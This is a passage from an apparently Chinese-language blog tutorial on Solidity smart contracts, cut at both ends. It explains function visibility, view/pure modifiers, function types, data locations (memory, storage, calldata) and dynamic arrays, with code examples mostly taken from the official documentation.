<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;= <span class="number">0.4</span><span class="number">.0</span> &lt; <span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract test&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fun1</span>(<span class="params"></span>) <span class="title">private</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fun2</span>(<span class="params"></span>) <span class="title">public</span></span>&#123;</span><br><span class="line">        fun1();</span><br><span class="line">        <span class="comment">//this.fun1()</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//合约的继承为is，这一点很容易理解，如果你明白设计模式的话，实际上继承是A is B 的关系,我很喜欢这种写法。</span></span><br><span class="line"></span><br><span class="line">contract ext is test&#123;   </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">callFun</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="comment">//fun1();   </span></span><br><span class="line">        fun2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;这里我们可以明确的看到private的效果，和internal类似，但是代价会更大。  </p>
<p>&emsp;&emsp;然而 <strong>public</strong> 与 <strong>private</strong> 还可以被作用于其他的变量，用于设置外部访问权限。  </p>
<p>&emsp;&emsp;请大家务必不要弄混 <strong>调用方式</strong> 与 <strong>可见性(visable)</strong> 。  </p>
<blockquote>
<p>关于 view pure constant  </p>
</blockquote>
<p>&emsp;&emsp;在0.4.1之前只有constant这一种可爱的语法，就是有一些屁事很多的人觉得constant指的是变量，作用于函数不太合适，所以就把constant拆成了view和pure。  </p>
<p>&emsp;&emsp;在Solidity中，<strong>constant view pure</strong> 的作用是告诉编译器，函数 <strong>不改变</strong>，<strong>不读取</strong>状态变量，这样一来函数的执行就不再消耗gas了，因为不再需要矿工去验证。  </p>
<p>&emsp;&emsp;然而这三个东西有点有意思，在官方文档中用 <strong>restrictive</strong> 这一词来对函数的严格性进行描述，在函数类型转换时对严格行有一定的要求，高严格性函数可以被转化为低严格性函数：  </p>
<ul>
<li><p>pure 类型可被转化为 <strong>view</strong> 和 <strong>non-payable</strong> 函数  </p>
</li>
<li><p>view 类型可被转化为 non-payable 函数  </p>
</li>
<li><p>payable 类型可被转化为 non-payable 函数  </p>
</li>
</ul>
<p>Member:  </p>
<ol>
<li>selector  返回ABI函数选择器。  </li>
<li>gas(uint) 返回一个函数对象，当被调用时将会发送具体数目的Gas给目标函数。  </li>
<li>value(uint)返回一个函数对象了，当被调用时将会发送具体的wei给目标函数，或者使用value(1 ether)的方式来发送以太币。  </li>
</ol>
<p>&emsp;&emsp;我们来看一下用法示例：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;=<span class="number">0.4</span><span class="number">.16</span> &lt;<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract Example &#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> <span class="title">returns</span> (<span class="params">bytes4</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.f.selector;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">g</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.f.gas(<span class="number">10</span>).value(<span class="number">800</span>)();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;下面是internal关键字的用法示例：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;=<span class="number">0.4</span><span class="number">.16</span> &lt;<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">library ArrayUtils &#123;</span><br><span class="line">  <span class="comment">// internal functions can be used in internal library functions because</span></span><br><span class="line">  <span class="comment">// they will be part of the same code context</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">map</span>(<span class="params">uint[] memory self, function (uint</span>) <span class="title">pure</span> <span class="title">returns</span> (<span class="params">uint</span>) <span class="title">f</span>)</span></span><br><span class="line"><span class="function">    <span class="title">internal</span></span></span><br><span class="line"><span class="function">    <span class="title">pure</span></span></span><br><span class="line"><span class="function">    <span class="title">returns</span> (<span class="params">uint[] memory r</span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    r = <span class="keyword">new</span> uint[](self.length);</span><br><span class="line">    <span class="keyword">for</span> (uint i = <span class="number">0</span>; i &lt; self.length; i++) &#123;</span><br><span class="line">      r[i] = f(self[i]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">reduce</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">    uint[] memory self,</span></span></span><br><span class="line"><span class="function"><span class="params">    function (uint, uint</span>) <span class="title">pure</span> <span class="title">returns</span> (<span class="params">uint</span>) <span class="title">f</span></span></span><br><span class="line"><span class="function">  )</span></span><br><span class="line"><span class="function">    <span class="title">internal</span></span></span><br><span class="line"><span class="function">    <span class="title">pure</span></span></span><br><span class="line"><span class="function">    <span class="title">returns</span> (<span class="params">uint r</span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    r = self[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> (uint i = <span class="number">1</span>; i &lt; self.length; i++) &#123;</span><br><span class="line">      r = f(r, self[i]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">range</span>(<span class="params">uint length</span>) <span class="title">internal</span> <span class="title">pure</span> <span class="title">returns</span> (<span class="params">uint[] memory r</span>) </span>&#123;</span><br><span class="line">    r = <span class="keyword">new</span> uint[](length);</span><br><span class="line">    <span class="keyword">for</span> (uint i = <span class="number">0</span>; i &lt; r.length; i++) &#123;</span><br><span class="line">      r[i] = i;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Pyramid &#123;</span><br><span class="line">  using ArrayUtils <span class="keyword">for</span> *;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">pyramid</span>(<span class="params">uint l</span>) <span class="title">public</span> <span class="title">pure</span> <span class="title">returns</span> (<span class="params">uint</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ArrayUtils.range(l).map(square).reduce(sum);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">square</span>(<span class="params">uint x</span>) <span class="title">internal</span> <span class="title">pure</span> <span class="title">returns</span> (<span class="params">uint</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x * x;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">sum</span>(<span class="params">uint x, uint y</span>) <span class="title">internal</span> <span class="title">pure</span> <span class="title">returns</span> (<span class="params">uint</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x + y;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;接下来是external关键字的用法：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;=<span class="number">0.4</span><span class="number">.22</span> &lt;<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract Oracle &#123;</span><br><span class="line">  struct Request &#123;</span><br><span class="line">    bytes data;</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params">uint</span>) <span class="title">external</span> <span class="title">callback</span>;</span></span><br><span class="line"><span class="function">  &#125;</span></span><br><span class="line">  Request[] requests;</span><br><span class="line">  event NewRequest(uint);</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">query</span>(<span class="params">bytes memory data, function(uint</span>) <span class="title">external</span> <span class="title">callback</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    requests.push(Request(data, callback));</span><br><span class="line">    emit NewRequest(requests.length - <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">reply</span>(<span class="params">uint requestID, uint response</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Here goes the check that the reply comes from a trusted source</span></span><br><span class="line">    requests[requestID].callback(response);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract OracleUser &#123;</span><br><span class="line">  Oracle constant oracle = Oracle(<span class="number">0x1234567</span>); <span class="comment">// known contract</span></span><br><span class="line">  uint exchangeRate;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">buySomething</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    oracle.query(<span class="string">"USD"</span>, <span class="keyword">this</span>.oracleResponse);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">oracleResponse</span>(<span class="params">uint response</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(</span><br><span class="line">        msg.sender == address(oracle),</span><br><span class="line">        <span class="string">"Only oracle can call this."</span></span><br><span class="line">    );</span><br><span class="line">    exchangeRate = response;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>Lambda(匿名)和inline(内联)函数暂时不支持，在后续版本即将推出。  </p>
</blockquote>
<ul>
<li>引用类型(Reference Type)  </li>
</ul>
<p>&emsp;&emsp;引用与C++中的引用类似，即一个量可以通过多个别名修改，与值类型相比较，后者可以直接得到一个拷贝对象。因此，在使用引用类型时应当格外小心。目前，引用类型包括结构，数组和映射。如果你使用一个引用类型，你必须显式的声明他的储存位置：  </p>
<blockquote>
<p>memory 生命周期为一个函数调用，只在EVM内存中存在<br>storage 生命周期无限，与状态变量一起储存在区块链上<br>calldata 包含函数参数的特殊数据位置，仅可用于external函数调用参数  </p>
</blockquote>
<p>&emsp;&emsp;更改Data Location的赋值或类型转换将会引发自动复制操作，若两者的Data Location类型相同，那么只在两者均为storage的某些情况下才会引发复制临时对象。  </p>
<h4 id="数据位置-Data-Location"><a href="#数据位置-Data-Location" class="headerlink" title="数据位置(Data Location)"></a>数据位置(Data Location)</h4><p>&emsp;&emsp;如上面提到，引用类型必须显式的添加”data location”的声明，即memory storage calldata.<br>&emsp;&emsp;Calldata只对external函数的参数有效，并且对于此类型的参数是必须的。Calldata类型的变量的存储位置是不可修改的，非持久的储存函数参数的区域，行为与memory十分类似。  </p>
<h4 id="内存区域和分配行为"><a href="#内存区域和分配行为" class="headerlink" title="内存区域和分配行为"></a>内存区域和分配行为</h4><p>&emsp;&emsp;数据位置不仅与数据的持久性有关，还与赋值的语义有关：  </p>
<ol>
<li>当赋值行为在memory(或者calldata)与storage之间时，会直接创造一个拷贝对象  </li>
<li>当赋值行为是memory与memory时，仅仅创造一个引用，这意味着如果修改其中一个memory变量，将会导致所指向的同一位置的内存数据的修改(与C语言的指针类似)  </li>
<li>当storage赋值给local storage(函数中的storage)之间时，此时也仅仅分配一个引用  </li>
<li>其他所有赋值给storage或状态变量的操作都会创造一个拷贝对象，即使给storage的局部变量仅仅是个引用。下面的例子展现了这几种特性：  </li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;=<span class="number">0.4</span><span class="number">.0</span> &lt;<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract C &#123;</span><br><span class="line">    uint[] x; <span class="comment">// the data location of x is storage</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// the data location of memoryArray is memory</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">uint[] memory memoryArray</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        x = memoryArray; <span class="comment">// works, copies the whole array to storage</span></span><br><span class="line">        uint[] storage y = x; <span class="comment">// works, assigns a pointer, data location of y is storage</span></span><br><span class="line">        y[<span class="number">7</span>]; <span class="comment">// fine, returns the 8th element</span></span><br><span class="line">        y.length = <span class="number">2</span>; <span class="comment">// fine, modifies x through y</span></span><br><span class="line">        <span class="keyword">delete</span> x; <span class="comment">// fine, clears the array, also modifies y</span></span><br><span class="line">        <span class="comment">// The following does not work; it would need to create a new temporary /</span></span><br><span class="line">        <span class="comment">// unnamed array in storage, but storage is "statically" allocated:</span></span><br><span class="line">        <span class="comment">// y = memoryArray;</span></span><br><span class="line">        <span class="comment">// This does not work either, since it would "reset" the pointer, but there</span></span><br><span class="line">        <span class="comment">// is no sensible location it could point to.</span></span><br><span class="line">        <span class="comment">// delete y;</span></span><br><span class="line">        g(x); <span class="comment">// calls g, handing over a reference to x</span></span><br><span class="line">        h(x); <span class="comment">// calls h and creates an independent, temporary copy in memory</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">g</span>(<span class="params">uint[] storage</span>) <span class="title">internal</span> <span class="title">pure</span> </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">h</span>(<span class="params">uint[] memory</span>) <span class="title">public</span> <span class="title">pure</span> </span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<ul>
<li>数组(Array)  </li>
</ul>
<p>&emsp;&emsp;数组的用法上面介绍的都差不多了，这里需要注意的是solidity中的数组的声明方式与通常的语言不同，他的第一个下标是一个数组的位置，第二个下标是数组中元素的位置：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">uint[][<span class="number">5</span>] x memory;		<span class="comment">//一个由5个储存uint类型的动态数组被写入数组x		这种方式与其他语言相反</span></span><br><span class="line"></span><br><span class="line">X[<span class="number">2</span>][<span class="number">1</span>];		<span class="comment">//代表第三个数组的第二个元素</span></span><br><span class="line"></span><br><span class="line">T[<span class="number">5</span>] a;			<span class="comment">//T本身可以是个数组，那么a[2]就代表T类型的变量</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;数组元素可以是任意类型，包括映射(mapping)与结构(struct)类型。但是通常情况下这种使用有限制，因为mapping与struct必须存储在storage数据区域内。  </p>
<p>&emsp;&emsp;将状态变量数组声明为public是可行的，并且solidity将会为其创建一个getter接口。那么数组的数字索引将会是getter()的参数。  </p>
<p>&emsp;&emsp;当数组寻址且超过其长度范围时，将会导致一个失败断言(failing assertion).你可以使用.push()与.pop()函数来向末尾增加或弹出元素(与C++的STL类似)，也可以直接修改.length成员来修改数组的长度。  </p>
<blockquote>
<p>关于bytes与string  </p>
</blockquote>
<p>&emsp;&emsp;bytes与string是特殊测数组，bytes与byte[]类似，但是他在calldata与memory存储区域内将会被打包的更紧致。string与bytes的区别是，string不能访问.length也不能进行寻址操作。  </p>
<p>&emsp;&emsp;solidity没有字符串操作函数，但有第三方字符串库。还可以使用keccak256-hash函数来比较两个字符串：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keccak256(abi.encodePacked(s1)) == keccak256(abi.encodePacked(s2))</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;并通过<code>abi.encodePacked(s1, s2)</code>来连接两个字符串。  </p>
<p>&emsp;&emsp;你应当尽量的使用bytes而不是bytes[]，因为bytes[]在两个元素之间增加了31个填充字节。作为一般规则，对任意长度的原始byte数据使用bytes，对任意长度字符串（UTF-8）数据使用string。  </p>
<blockquote>
<p>加入你一定要对string对象进行.length或者寻址操作，那么你应当先把他强制转换为bytes类型，如：  </p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">string s;</span><br><span class="line"></span><br><span class="line">uint len = bytes(s).length;</span><br><span class="line"></span><br><span class="line">bytes(s)[<span class="number">7</span>] = <span class="string">'x'</span>;</span><br></pre></td></tr></table></figure>
<h4 id="为数组分配内存"><a href="#为数组分配内存" class="headerlink" title="为数组分配内存"></a>为数组分配内存</h4><p>&emsp;&emsp;为数组分配内存与C++类似，要使用new关键字在内存中创建运行时确定长度的数组,如：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;=<span class="number">0.4</span><span class="number">.16</span> &lt;<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract C &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">uint len</span>) <span class="title">public</span> <span class="title">pure</span> </span>&#123;</span><br><span class="line">        uint[] memory a = <span class="keyword">new</span> uint[](<span class="number">7</span>);</span><br><span class="line">        bytes memory b = <span class="keyword">new</span> bytes(len);</span><br><span class="line">        assert(a.length == <span class="number">7</span>);</span><br><span class="line">        assert(b.length == len);</span><br><span class="line">        a[<span class="number">6</span>] = <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="数组成员"><a href="#数组成员" class="headerlink" title="数组成员"></a>数组成员</h4><p><strong>Length</strong>:<br>    数组的length成员包含了数组元素的个数，这个长度在内存中一旦确定是不可变的(不包括动态数组)，对于动态数组，给length重新赋值能够修改其长度。当寻址超出长度之外时，你将会引发一个失败断言。新增加的长度的值被初始化为0,你可以通过delete关键字删除单个的元素来减少数组的长度。如果你尝试改变一个非动态数组的length，你会得到一个<code>Value must be an lvalue</code>错误。  </p>
<p><strong>push</strong>:<br>&emsp;&emsp;动态数组以及bytes与string拥有push()成员函数，你可以使用push来向数组末尾添加一个元素，若参数为空则默认为0,该函数返回新的数组长度。  </p>
<p><strong>pop</strong>:<br>&emsp;&emsp;动态数组以及bytes与string拥有pop()成员函数，你可以使用pop来删除数组末尾的最后一个元素。  </p>
<blockquote>
<p>注意：  </p>
<blockquote>
<p>这里一定要注意动态数组的下溢问题(underflow)，假如你对一个空数组进行<code>&lt;d-array&gt;.length--</code>操作，那么这将会导致数组的长度变为2**256 - 1,这意味着你将可以访问内存中的任意变量，也可能导致某些逻辑判断的步骤出错。  </p>
</blockquote>
</blockquote>
<p>&emsp;&emsp;增加数组的长度将会消耗固定的Gas，因为新增的元素被初始化为0,当减少长度时则消耗线性的Gas(但通常情况下要比线性糟糕)，    因为包含了显式的删除与清理元素的步骤，即调用delete关键字。  </p>
<blockquote>
<p>目前还不能在external函数中使用数组的数组，但是在public函数中是支持的。  </p>
</blockquote>
<blockquote>
<p>在拜占庭(Byzantium)之前的EVM版本中，无法访问函数调用返回的动态数组。如果调用返回动态数组的函数，请确保使用设置为拜占庭模式的EVM。关于拜占庭请参考白皮书中的拜占庭将军问题，很有意思。</p>
</blockquote>
<p>&emsp;&emsp;数组用法实例如下：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;=<span class="number">0.4</span><span class="number">.16</span> &lt;<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract ArrayContract &#123;</span><br><span class="line">    uint[<span class="number">2</span>**<span class="number">20</span>] m_aLotOfIntegers;</span><br><span class="line">    <span class="comment">// Note that the following is not a pair of dynamic arrays but a</span></span><br><span class="line">    <span class="comment">// dynamic array of pairs (i.e. of fixed size arrays of length two).</span></span><br><span class="line">    <span class="comment">// Because of that, T[] is always a dynamic array of T, even if T</span></span><br><span class="line">    <span class="comment">// itself is an array.</span></span><br><span class="line">    <span class="comment">// Data location for all state variables is storage.</span></span><br><span class="line">    bool[<span class="number">2</span>][] m_pairsOfFlags;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// newPairs is stored in memory - the only possibility</span></span><br><span class="line">    <span class="comment">// for public contract function arguments</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setAllFlagPairs</span>(<span class="params">bool[<span class="number">2</span>][] memory newPairs</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="comment">// assignment to a storage array performs a copy of ``newPairs`` and</span></span><br><span class="line">        <span class="comment">// replaces the complete array ``m_pairsOfFlags``.</span></span><br><span class="line">        m_pairsOfFlags = newPairs;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    struct StructType &#123;</span><br><span class="line">        uint[] contents;</span><br><span class="line">        uint moreInfo;</span><br><span class="line">    &#125;</span><br><span class="line">    StructType s;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">uint[] memory c</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="comment">// stores a reference to ``s`` in ``g``</span></span><br><span class="line">        StructType storage g = s;</span><br><span class="line">        <span class="comment">// also changes ``s.moreInfo``.</span></span><br><span class="line">        g.moreInfo = <span class="number">2</span>;</span><br><span class="line">        <span class="comment">// assigns a copy because ``g.contents``</span></span><br><span class="line">        <span class="comment">// is not a local variable, but a member of</span></span><br><span class="line">        <span class="comment">// a local variable.</span></span><br><span class="line">        g.contents = c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setFlagPair</span>(<span class="params">uint index, bool flagA, bool flagB</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="comment">// access to a non-existing index will throw an exception</span></span><br><span class="line">        m_pairsOfFlags[index][<span class="number">0</span>] = flagA;</span><br><span class="line">        m_pairsOfFlags[index][<span class="number">1</span>] = flagB;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">changeFlagArraySize</span>(<span class="params">uint newSize</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="comment">// if the new size is smaller, removed array elements will be cleared</span></span><br><span class="line">        m_pairsOfFlags.length = newSize;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">clear</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="comment">// these clear the arrays completely</span></span><br><span class="line">        <span class="keyword">delete</span> m_pairsOfFlags;</span><br><span class="line">        <span class="keyword">delete</span> m_aLotOfIntegers;</span><br><span class="line">        <span class="comment">// identical effect here</span></span><br><span class="line">        m_pairsOfFlags.length = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    bytes m_byteData;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">byteArrays</span>(<span class="params">bytes memory data</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="comment">// byte arrays ("bytes") are different as they are stored without padding,</span></span><br><span class="line">        <span class="comment">// but can be treated identical to "uint8[]"</span></span><br><span class="line">        m_byteData = data;</span><br><span class="line">        m_byteData.length += <span class="number">7</span>;</span><br><span class="line">        m_byteData[<span class="number">3</span>] = <span class="number">0x08</span>;</span><br><span class="line">        <span class="keyword">delete</span> m_byteData[<span class="number">2</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">addFlag</span>(<span class="params">bool[<span class="number">2</span>] memory flag</span>) <span class="title">public</span> <span class="title">returns</span> (<span class="params">uint</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> m_pairsOfFlags.push(flag);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">createMemoryArray</span>(<span class="params">uint size</span>) <span class="title">public</span> <span class="title">pure</span> <span class="title">returns</span> (<span class="params">bytes memory</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// Dynamic memory arrays are created using `new`:</span></span><br><span class="line">        uint[<span class="number">2</span>][] memory arrayOfPairs = <span class="keyword">new</span> uint[<span class="number">2</span>][](size);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Inline arrays are always statically-sized and if you 